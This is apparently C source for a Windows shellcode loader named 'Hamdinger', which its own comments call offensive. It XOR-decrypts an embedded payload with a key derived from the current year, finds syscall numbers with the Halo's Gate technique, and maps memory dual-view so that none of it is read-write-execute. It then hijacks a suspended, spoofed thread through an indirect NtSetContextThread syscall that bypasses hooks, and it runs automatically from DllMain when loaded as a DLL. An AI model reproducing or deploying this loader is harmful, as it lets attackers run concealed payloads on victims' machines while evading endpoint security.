#include <windows.h>
#include <stdio.h>

// --- NTAPI & Assembly Prototypes ---
extern NTSTATUS InvokeIndirectSyscall(HANDLE hThread, PCONTEXT lpContext, PVOID dummy1, PVOID dummy2, DWORD ssn, PVOID syscallAddr);

typedef NTSTATUS (NTAPI *pNtCreateSection)(OUT PHANDLE, IN ACCESS_MASK, IN PVOID, IN PLARGE_INTEGER, IN ULONG, IN ULONG, IN HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(IN HANDLE, IN HANDLE, IN OUT PVOID*, IN ULONG_PTR, IN SIZE_T, IN OUT PLARGE_INTEGER, IN OUT PSIZE_T, IN DWORD, IN ULONG, IN ULONG);

#include "hamdinger_data.h"
#define HAMDINGER_PART "LudicrousGibs"
#define MAX_KEY_LEN 100

// --- Helper: XOR Decryption ---
void xor_decrypt(unsigned char* data, unsigned int data_len, const char* key) {
    unsigned int key_len = strlen(key);
    for (unsigned int i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// --- Helper: Halo's Gate (SSN Discovery) ---
DWORD GetSSN(PVOID funcAddr) {
    unsigned char* pFunc = (unsigned char*)funcAddr;
    if (*pFunc == 0x4C && *(pFunc + 1) == 0x8B && *(pFunc + 2) == 0xD1 && *(pFunc + 3) == 0xB8) {
        return *(DWORD*)(pFunc + 4);
    }
    // Check neighbors (Halos Gate)
    for (int i = 1; i < 50; i++) {
        if (*(pFunc - (i * 32)) == 0x4C && *(pFunc - (i * 32) + 3) == 0xB8) return *(DWORD*)(pFunc - (i * 32) + 4) + i;
        if (*(pFunc + (i * 32)) == 0x4C && *(pFunc + (i * 32) + 3) == 0xB8) return *(DWORD*)(pFunc + (i * 32) + 4) - i;
    }
    return 0;
}

// --- Helper: Find 'syscall; ret' in ntdll ---
PVOID FindSyscallInstruction(PVOID funcAddr) {
    unsigned char* pFunc = (unsigned char*)funcAddr;
    for (int i = 0; i < 50; i++) {
        if (*(pFunc + i) == 0x0F && *(pFunc + i + 1) == 0x05) return (PVOID)(pFunc + i);
    }
    return NULL;
}

// --- Main Offensive Logic ---
void RunHamdinger() {
    // 1. Setup Key (Year-based)
    SYSTEMTIME st;
    char yack_face[MAX_KEY_LEN];
    char bear_str[5];
    GetLocalTime(&st);
    _snprintf(bear_str, sizeof(bear_str), "%d", st.wYear);
    strcpy(yack_face, HAMDINGER_PART);
    strcat(yack_face, bear_str);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    // 2. Resolve SSN and Syscall jump target for Hijacking
    PVOID pNtSCT = GetProcAddress(hNtdll, "NtSetContextThread");
    DWORD ssn = GetSSN(pNtSCT);
    PVOID syscallInst = FindSyscallInstruction(pNtSCT);

    // 3. Dual Mapping Bypass (Avoid RWX memory)
    HANDLE hSection = NULL;
    PVOID pRW = NULL, pRX = NULL;
    SIZE_T vSize = 0;
    LARGE_INTEGER sSize = { .QuadPart = hamdinger_len };

    // Create section that allows execution
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    
    // Map View 1: Read/Write for decryption
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pRW, 0, 0, NULL, &vSize, 2, 0, PAGE_READWRITE);
    RtlMoveMemory(pRW, encrypted_hamdinger, hamdinger_len);
    xor_decrypt((unsigned char*)pRW, hamdinger_len, yack_face);

    // Map View 2: Read/Execute for running
    vSize = 0; // Reset size for new mapping
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pRX, 0, 0, NULL, &vSize, 2, 0, PAGE_EXECUTE_READ);

    // 4. Create Spoofed Thread (Suspended)
    // Points to a benign function initially to look normal
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetTickCount, NULL, CREATE_SUSPENDED, NULL);

    // 5. Hijack Thread Context via Indirect Syscall
    CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };
    GetThreadContext(hThread, &ctx);
    
    // Change Instruction Pointer to our RX view of the shellcode
#ifdef _M_IX86
    ctx.Eip = (DWORD_PTR)pRX;
#else
    ctx.Rip = (DWORD64)pRX;
#endif

    // Execute NtSetContextThread via our assembly bridge (bypassing hooks)
    InvokeIndirectSyscall(hThread, &ctx, NULL, NULL, ssn, syscallInst);

    printf("[+] Indirect Hijack Complete. Resuming Thread...\n");
    ResumeThread(hThread);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hSection);
}

// --- Entry Points ---

#ifdef BUILD_EXE
int main() {
    printf("[*] Starting Standalone Hamdinger...\n");
    RunHamdinger();
    return 0;
}
#else
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        HANDLE hT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunHamdinger, NULL, 0, NULL);
        if (hT) CloseHandle(hT);
    }
    return TRUE;
}
#endif
